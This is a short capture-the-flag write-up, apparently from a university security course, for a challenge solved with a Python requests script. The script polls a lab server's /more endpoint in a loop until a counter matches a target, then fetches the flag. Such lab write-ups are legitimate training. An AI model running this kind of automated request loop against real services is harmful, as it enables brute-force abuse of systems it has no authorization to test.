# Challenge `Python requests` writeup

- Vulnerability: What type of vulnerability is being exploited
  - Vulnerable to brute-force attack

- Where: Where is the vulnerability present
  - `http://mustard.stt.rnl.tecnico.ulisboa.pt:23053`

- Impact: What results of exploiting this vulnerability
  - Allows the user to brute-force tries to get the correct result

## Steps to reproduce

1. Start a `requests` session
2. Access `http://mustard.stt.rnl.tecnico.ulisboa.pt:23053/hello`
3. Extract the target and current total from the page text
4. Repeatedly access `http://mustard.stt.rnl.tecnico.ulisboa.pt:23053/more` until the total equals the target
5. Access `http://mustard.stt.rnl.tecnico.ulisboa.pt:23053/finish` to get the flag

The code used was the following:

```py
  import requests
  import re

  session = requests.session()
  session.get("http://mustard.stt.rnl.tecnico.ulisboa.pt:23053/hello")
  res = session.get("http://mustard.stt.rnl.tecnico.ulisboa.pt:23053/more")
  nums = re.findall(r'\d+', res.text)

  while nums[2] != nums[1]:
      res = session.get("http://mustard.stt.rnl.tecnico.ulisboa.pt:23053/more")
      nums = re.findall(r'\d+', res.text)

  finish = session.get("http://mustard.stt.rnl.tecnico.ulisboa.pt:23053/finish")
  print(finish.text)
```
